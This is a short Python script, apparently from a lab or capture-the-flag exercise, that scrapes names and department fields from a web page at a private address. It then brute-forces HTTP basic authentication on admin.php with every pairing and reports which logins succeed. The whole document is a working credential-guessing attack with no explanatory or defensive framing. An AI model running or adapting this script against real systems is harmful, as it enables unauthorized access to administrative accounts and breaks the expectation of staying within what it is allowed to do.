from bs4 import BeautifulSoup
import requests

res = requests.get("http://172.16.120.120/")
print("Body")
html_doc = res.text
print(html_doc)
users = []
passwds = []
soup = BeautifulSoup(html_doc, 'html.parser')
ids = ["name", "department"]
for Id in ids:
    print(Id + " : ")
    for td in soup.find_all(id = Id):
        if Id == "name":
            users.append(td.string)
        else:
            passwds.append(td.string)
        print(td.string)
    print("*************************************************************")
users = sorted(set(users))
passwds = sorted(set(passwds))
for user in users:
    for passwd in passwds:
        res = requests.get("http://172.16.120.120/admin.php", auth=(user, passwd))
        if res.status_code != 401:
            print("[+] Success with {} {}".format(user, passwd))
        else:
            print("[+] Fail with {} {}".format(user, passwd))
